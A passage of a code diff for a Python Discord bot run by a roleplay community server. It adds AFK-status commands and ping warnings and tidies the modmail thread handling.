+    afk_reasons.pop(interaction.user.id, None)
+
+    embed = discord.Embed(
+        description=f"{interaction.user.mention} is no longer AFK.",
+        color=discord.Color.green(),
+        timestamp=discord.utils.utcnow()
+    )
+    if interaction.guild.icon:
+        embed.set_thumbnail(url=interaction.guild.icon.url)
+    embed.set_footer(text="SWAT Roleplay Community")
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.command(name="unafk")
+async def unafk_prefix(ctx):
+    afk_role = ctx.guild.get_role(afk_role_id)
+    if not afk_role:
+        await ctx.send(f"{error_emoji} AFK role not found on this server please open a ticket.")
+        return
+
+    if afk_role not in ctx.author.roles:
+        await ctx.send(f"{error_emoji} You are not marked as AFK.")
+        return
+
+    await ctx.author.remove_roles(afk_role, reason="User removed AFK status")
+    afk_reasons.pop(ctx.author.id, None)
+
+    embed = discord.Embed(
+        description=f"{ctx.author.mention} is no longer AFK.",
+        color=discord.Color.green(),
+        timestamp=discord.utils.utcnow()
+    )
+    if ctx.guild.icon:
+        embed.set_thumbnail(url=ctx.guild.icon.url)
+    embed.set_footer(text="SWAT Roleplay Community")
+
+    await ctx.send(embed=embed)
+
+# ---- on_message event (merged AFK mention detection + modmail + auto-unafk) ----
 
 @bot.event
 async def on_message(message):
     if message.author.bot:
         return
 
+    # Auto remove AFK if user sends a message and is AFK
+    afk_role = message.guild.get_role(afk_role_id) if message.guild else None
+    if afk_role and afk_role in message.author.roles:
+        await message.author.remove_roles(afk_role, reason="User sent a message, removed AFK")
+        afk_reasons.pop(message.author.id, None)
+        try:
+            await message.channel.send(f"Welcome back, {message.author.mention}. I've removed your AFK status.")
+        except Exception:
+            pass
+
+    # AFK mention detection
+    if message.guild and afk_role:
+        for user in message.mentions:
+            if afk_role in user.roles:
+                reason = afk_reasons.get(user.id, "AFK")
+                embed = discord.Embed(
+                    description=(
+                        f"{note_emoji} Please do not ping {user.mention}.\n"
+                        f"They are currently AFK: {reason}"
+                    ),
+                    color=discord.Color.orange(),
+                    timestamp=discord.utils.utcnow()
+                )
+                if message.guild.icon:
+                    embed.set_thumbnail(url=message.guild.icon.url)
+                embed.set_footer(text="SWAT Roleplay Community")
+                await message.channel.send(embed=embed)
+                break
+
+    # Modmail DM handling
     if message.guild is None:
         user = message.author
         if user.id in active_threads:
             guild = bot.get_guild(GUILD_ID)
-            channel = guild.get_channel(active_threads[user.id])
+            channel = guild.get_channel(active_threads[user.id]) if guild else None
         else:
             channel = None
 
@@ -3726,7 +3763,8 @@ async def on_message(message):
 
         embed = discord.Embed(description=message.content, color=discord.Color.green())
         embed.set_author(name=str(user), icon_url=user.display_avatar.url)
-        await channel.send(embed=embed)
+        if channel:
+            await channel.send(embed=embed)
     else:
         topic = message.channel.topic
         if topic and topic.startswith("ID:") and message.author.id != bot.user.id:
@@ -3739,7 +3777,11 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(f"{failed_emoji} Could not message user: {e}")
 
-# ========== Slash Commands ==========
+    # Process commands for prefix and slash
+    await bot.process_commands(message)
+
+# --- Slash commands ---
+
 @bot.tree.command(name="claim", description="Claim this modmail thread.")
 @app_commands.checks.has_any_role(*STAFF_ROLE_IDS)
 async def claim(interaction: discord.Interaction):
@@ -3756,16 +3798,13 @@ async def claim(interaction: discord.Interaction):
     try:
         await user.send(f"👮 Your modmail was claimed by {interaction.user.name}.")
     except discord.Forbidden:
-        # User has DMs off or blocked the bot
-        log_channel = bot.get_channel(TRANSCRIPT_LOG_CHANNEL)  # Optional: log somewhere
+        log_channel = bot.get_channel(TRANSCRIPT_LOG_CHANNEL)
         if log_channel:
             await log_channel.send(f"{error_emoji} Could not DM user `{user}` about the claim — DMs are disabled.")
     except discord.HTTPException as e:
-        # Any other DM failure
         log_channel = bot.get_channel(TRANSCRIPT_LOG_CHANNEL)
         if log_channel:
             await log_channel.send(f"{failed_emoji} Failed to send claim DM to `{user}`: {e}")
-
 
 @bot.tree.command(name="close", description="Close and archive this thread.")
 @app_commands.checks.has_any_role(*STAFF_ROLE_IDS)
@@ -3794,11 +3833,15 @@ async def close(interaction: discord.Interaction):
     if user_id in active_threads:
         del active_threads[user_id]
 
-
 @bot.tree.command(name="delete", description="Delete this modmail channel.")
 @app_commands.checks.has_any_role(*STAFF_ROLE_IDS)
 async def delete(interaction: discord.Interaction):
     await interaction.response.send_message("🗑 Deleting channel...", ephemeral=True)
+    if interaction.channel.id in active_threads.values():
+        # Remove from active threads if present
+        to_remove = [k for k, v in active_threads.items() if v == interaction.channel.id]
+        for key in to_remove:
+            del active_threads[key]
     await interaction.channel.delete()
 
 @bot.tree.command(name="transcript", description="Get transcript of this thread.")
@@ -3950,16 +3993,3 @@ async def send_command_detail(target, command_name):
 if __name__ == "__main__":
     load_events()
     bot.run(os.getenv("DISCORD_TOKEN"))
-
-
-
-
-
-
-
-
-
-
-
-
-
